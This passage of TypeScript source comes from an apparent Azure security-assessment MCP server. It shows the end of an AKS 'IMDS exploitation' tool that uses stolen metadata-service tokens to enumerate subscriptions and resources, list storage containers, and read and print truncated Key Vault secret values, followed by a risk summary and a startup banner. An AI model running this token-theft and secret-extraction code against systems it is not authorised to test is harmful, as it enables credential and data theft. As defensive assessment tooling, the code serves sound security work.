            output += `⚠️ Subscription enum failed: ${e.message}\n\n`;
          }

          // Resource Groups
          output += `### Accessible Resource Groups\n\n`;
          let resourceGroups: string[] = [];
          try {
            const rgResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/resourcegroups?api-version=2021-04-01" 2>&1`);
            
            if (rgResp.includes('"value"')) {
              const rgData = JSON.parse(rgResp);
              resourceGroups = (rgData.value || []).map((rg: any) => rg.name);
              
              output += `| Resource Group | Location |\n|----------------|----------|\n`;
              for (const rg of rgData.value?.slice(0, 10) || []) {
                output += `| ${rg.name} | ${rg.location} |\n`;
              }
              if (resourceGroups.length > 10) {
                output += `| ... | (${resourceGroups.length - 10} more) |\n`;
              }
              output += `\n`;
              
              findings.push({
                severity: 'HIGH',
                category: 'Resource Groups',
                finding: `${resourceGroups.length} resource group(s) accessible`,
                details: resourceGroups.slice(0, 5).join(', ')
              });
              highCount++;
            }
          } catch (e: any) {
            output += `⚠️ Resource group enum failed: ${e.message}\n\n`;
          }

          // Key Resources
          output += `### Key Azure Resources\n\n`;
          output += `| Resource Type | Count | Examples |\n|---------------|-------|----------|\n`;
          
          const resourceTypes = [
            { type: 'Microsoft.Storage/storageAccounts', name: 'Storage Accounts', icon: '📦' },
            { type: 'Microsoft.KeyVault/vaults', name: 'Key Vaults', icon: '🔐' },
            { type: 'Microsoft.ContainerRegistry/registries', name: 'Container Registries', icon: '🐳' },
            { type: 'Microsoft.Sql/servers', name: 'SQL Servers', icon: '🗄️' },
            { type: 'Microsoft.Compute/virtualMachines', name: 'Virtual Machines', icon: '💻' },
          ];
          
          for (const rt of resourceTypes) {
            try {
              const resResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/${rt.type}?api-version=2023-01-01" 2>&1`);
              
              if (resResp.includes('"value"')) {
                const resData = JSON.parse(resResp);
                const resources = resData.value || [];
                const examples = resources.slice(0, 3).map((r: any) => r.name);
                
                output += `| ${rt.icon} ${rt.name} | **${resources.length}** | ${examples.join(', ') || '-'} |\n`;
                
                if (resources.length > 0) {
                  findings.push({
                    severity: 'MEDIUM',
                    category: rt.name,
                    finding: `${resources.length} ${rt.name.toLowerCase()} accessible`,
                    details: examples.join(', ')
                  });
                  mediumCount++;
                }
              } else {
                output += `| ${rt.icon} ${rt.name} | 0 | - |\n`;
              }
            } catch (e: any) {
              output += `| ${rt.icon} ${rt.name} | ❌ | Error |\n`;
            }
          }
          output += `\n`;

          output += `## 🔓 Phase 4: Data Plane Access Testing\n\n`;

          // Key Vault secrets
          const kvToken = stolenTokens.find(t => t.resource.includes('vault.azure.net'))?.accessToken;
          if (kvToken) {
            output += `### 🔐 Key Vault Secrets\n\n`;
            
            try {
              const kvResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.KeyVault/vaults?api-version=2023-02-01" 2>&1`);
              
              if (kvResp.includes('"value"')) {
                const kvData = JSON.parse(kvResp);
                const keyVaults = kvData.value || [];
                
                output += `| Key Vault | Secrets | Status |\n|-----------|---------|--------|\n`;
                
                for (const kv of keyVaults.slice(0, 5)) {
                  const kvName = kv.name;
                  const kvUri = kv.properties?.vaultUri || `https://${kvName}.vault.azure.net/`;
                  
                  try {
                    const secretsResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${kvToken}" "${kvUri}secrets?api-version=7.4" 2>&1`);
                    
                    if (secretsResp.includes('"value"')) {
                      const secretsData = JSON.parse(secretsResp);
                      const secrets = secretsData.value || [];
                      
                      output += `| ${kvName} | ${secrets.length} | ✅ Accessible |\n`;
                      
                      if (secrets.length > 0) {
                        findings.push({
                          severity: 'CRITICAL',
                          category: 'Key Vault',
                          finding: `${secrets.length} secrets accessible in ${kvName}`,
                          details: 'Can read secret values'
                        });
                        criticalCount++;
                        
                        // Deep read secret values if enabled
                        if (deepDataPlane) {
                          output += `\n**Secret Values from ${kvName}:**\n\n`;
                          output += `| Secret Name | Value (truncated) | Type |\n|-------------|-------------------|------|\n`;
                          
                          for (const secret of secrets.slice(0, 5)) {
                            const secretId = secret.id || '';
                            const secretName = secretId.split('/secrets/')[1]?.split('/')[0] || 'unknown';
                            
                            try {
                              const valueResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${kvToken}" "${kvUri}secrets/${secretName}?api-version=7.4" 2>&1`);
                              
                              if (valueResp.includes('"value"')) {
                                const valueData = JSON.parse(valueResp);
                                const value = valueData.value || '';
                                const displayValue = value.substring(0, 20) + (value.length > 20 ? '...' : '');
                                
                                let secretType = 'unknown';
                                if (value.includes('-----BEGIN')) secretType = '🔑 CERT/KEY';
                                else if (value.match(/^[A-Za-z0-9+/=]{40,}$/)) secretType = '🔐 TOKEN';
                                else if (value.includes('DefaultEndpointsProtocol')) secretType = '📦 CONN STR';
                                else secretType = '📝 TEXT';
                                
                                output += `| \`${secretName}\` | \`${displayValue}\` | ${secretType} |\n`;
                              }
                            } catch (e) {
                              output += `| \`${secretName}\` | ❌ Access denied | - |\n`;
                            }
                          }
                          output += `\n`;
                        }
                      }
                    } else {
                      output += `| ${kvName} | - | ❌ Access denied |\n`;
                    }
                  } catch (e) {
                    output += `| ${kvName} | - | ❌ Error |\n`;
                  }
                }
                output += `\n`;
              }
            } catch (e: any) {
              output += `⚠️ Key Vault enum failed: ${e.message}\n\n`;
            }
          }

          // Storage blobs
          const storageToken = stolenTokens.find(t => t.resource.includes('storage.azure.com'))?.accessToken;
          if (storageToken) {
            output += `### 📦 Storage Account Access\n\n`;
            
            try {
              const saResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" 2>&1`);
              
              if (saResp.includes('"value"')) {
                const saData = JSON.parse(saResp);
                const storageAccounts = saData.value || [];
                
                output += `| Storage Account | Containers | Status |\n|-----------------|------------|--------|\n`;
                
                for (const sa of storageAccounts.slice(0, 5)) {
                  const saName = sa.name;
                  
                  try {
                    const blobResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${storageToken}" --header="x-ms-version: 2021-06-08" "https://${saName}.blob.core.windows.net/?comp=list" 2>&1`);
                    
                    if (blobResp.includes('Container')) {
                      const containerMatches = blobResp.match(/<Name>([^<]+)<\/Name>/g) || [];
                      const containerCount = containerMatches.length;
                      
                      output += `| ${saName} | ${containerCount} | ✅ Accessible |\n`;
                      
                      if (containerCount > 0) {
                        findings.push({
                          severity: 'HIGH',
                          category: 'Storage',
                          finding: `${containerCount} containers accessible in ${saName}`,
                          details: 'Blob access confirmed'
                        });
                        highCount++;
                      }
                    } else {
                      output += `| ${saName} | - | ❌ Access denied |\n`;
                    }
                  } catch (e) {
                    output += `| ${saName} | - | ❌ Error |\n`;
                  }
                }
                output += `\n`;
              }
            } catch (e: any) {
              output += `⚠️ Storage enum failed: ${e.message}\n\n`;
            }
          }

          output += `---\n\n`;
          output += `## 📊 Attack Summary\n\n`;
          
          output += `### MITRE ATT&CK Techniques\n\n`;
          output += `| Technique | ID | Status |\n|-----------|-----|--------|\n`;
          output += `| Cloud Instance Metadata API | T1552.005 | ✅ Exploited |\n`;
          output += `| Valid Accounts: Cloud | T1078.004 | ✅ Token Theft |\n`;
          output += `| Steal Application Access Token | T1528 | ✅ ${stolenTokens.length} tokens |\n`;
          output += `| Data from Cloud Storage | T1530 | ${findings.some(f => f.category === 'Storage') ? '✅ Accessible' : '❌ Blocked'} |\n\n`;

          output += `### Findings Summary\n\n`;
          output += `| Severity | Count |\n|----------|-------|\n`;
          output += `| 🔴 CRITICAL | ${criticalCount} |\n`;
          output += `| 🟠 HIGH | ${highCount} |\n`;
          output += `| 🟡 MEDIUM | ${mediumCount} |\n`;
          output += `| 🟢 LOW | ${lowCount} |\n`;
          output += `| **TOTAL** | **${findings.length}** |\n\n`;

          // Risk score
          const riskScore = (criticalCount * 40) + (highCount * 20) + (mediumCount * 5) + (lowCount * 1);
          let riskLevel = 'LOW';
          let riskEmoji = '🟢';
          if (riskScore >= 100) { riskLevel = 'CRITICAL'; riskEmoji = '🔴'; }
          else if (riskScore >= 50) { riskLevel = 'HIGH'; riskEmoji = '🟠'; }
          else if (riskScore >= 20) { riskLevel = 'MEDIUM'; riskEmoji = '🟡'; }
          
          output += `**Risk Score:** ${riskScore} | **Risk Level:** ${riskEmoji} **${riskLevel}**\n\n`;

          // Remediation
          output += `## 🛡️ Remediation\n\n`;
          output += `1. **Block IMDS Access** - Apply NetworkPolicy to affected namespaces\n`;
          output += `2. **Enable Workload Identity** - \`az aks update -g ${resourceGroup} -n ${clusterName} --enable-workload-identity\`\n`;
          output += `3. **Reduce Identity Permissions** - Review kubelet managed identity RBAC\n\n`;

          output += `---\n*Generated by Stratos MCP v${SERVER_VERSION} - IMDS Exploitation*\n`;

          // Cleanup
          try { await fsMod.unlink(tempKubeconfig); } catch (e) {}

          return {
            content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error running IMDS scan: ${error.message}` }],
            isError: true,
          };
        }
      }

      default:
        performanceTracker.end(trackingId, false, 'UNKNOWN_TOOL');
        logger.warn(`Unknown tool requested: ${name}`, { tool: name }, name);
        throw new ValidationError(`Unknown tool: ${name}`, { tool: name });
    }
  } catch (error) {
    // End performance tracking with failure
    performanceTracker.end(trackingId, false, error instanceof Error ? error.name : 'UnknownError');
    
    // Normalize error to structured format
    const structured = normalizeError(error);
    
    // Log error with PII redaction
    logger.error(`Tool execution failed: ${name}`, structured.toJSON(), name);
    
    // Return formatted error response
    const format = args?.format === 'json' ? 'json' : 'markdown';
    const errorOutput = format === 'json' 
      ? formatErrorJSON(structured)
      : formatErrorMarkdown(structured);
    
    return {
      content: [
        {
          type: "text",
          text: errorOutput,
        },
      ],
      isError: true,
    };
  }
});

// Start the server
async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  
  // Display welcome message
  console.error("\n" + "=".repeat(70));
  console.error("Stratos - Azure Security Assessment MCP Server");
  console.error("=".repeat(70));
  console.error("\n[OK] Server Status: Running");
  console.error("Transport: stdio");
  console.error(`Version: ${SERVER_VERSION}`);
  console.error("\nAvailable Tools (37):");
  console.error("\n  Multi-Location Scanning:");
  console.error("   1. list_active_locations     - Discover active Azure regions");
  console.error("   2. scan_all_locations        - Scan resources across regions");
  console.error("\n  Core Enumeration:");
  console.error("   3. enumerate_subscriptions   - List Azure subscriptions");
  console.error("   4. enumerate_resource_groups - List resource groups");
  console.error("   5. enumerate_resources       - List resources");
  console.error("   6. get_resource_details      - Detailed resource config");
  console.error("\n  Network & Storage Security:");
  console.error("   7. analyze_storage_security  - Storage misconfiguration scanner");
  console.error("   8. analyze_nsg_rules         - Network exposure analyzer");
  console.error("   9. enumerate_public_ips      - Internet attack surface mapping");
  console.error("   10. enumerate_rbac_assignments - Access control auditing");
  console.error("\n  Database, Secrets, Compute:");
  console.error("   11. scan_sql_databases       - SQL security & TDE encryption");
  console.error("   12. analyze_keyvault_security - Key Vault configuration audit");
  console.error("   13. analyze_cosmosdb_security - Cosmos DB exposure checker");
  console.error("   14. analyze_vm_security      - VM disk encryption & agents");
  console.error("\n  AKS/Kubernetes Security (8 tools):");
  console.error("   15. scan_aks_full            - Full AKS security scan");
  console.error("   16. scan_aks_clusters        - AKS RBAC & network policies");
  console.error("   17. get_aks_credentials      - Extract kubeconfig & admin access");
  console.error("   18. enumerate_aks_identities - Map managed identities & RBAC");
  console.error("   19. scan_aks_node_security   - Node encryption & SSH analysis");
  console.error("   20. scan_aks_service_accounts - Service account security");
  console.error("   21. scan_aks_secrets         - Kubernetes secret enumeration");
  console.error("   22. scan_aks_live            - Live K8s API security scan (20 checks)");
  console.error("   23. scan_aks_imds            - IMDS exploitation & full recon");
  console.error("\n  DevOps & Reporting:");
  console.error("   24. scan_azure_devops        - Azure DevOps security scanner");
  console.error("   25. generate_security_report - PDF/HTML/CSV report export");
  console.error("\n[TIP] Quick Start:");
  console.error("   scan_aks_imds subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
  console.error("   scan_aks_live subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
  console.error("\nAuthentication: Using Azure CLI credentials (az login)");
  console.error("=".repeat(70) + "\n");
}

main().catch((error) => {
  console.error("Fatal error in main():", error);
  process.exit(1);
});
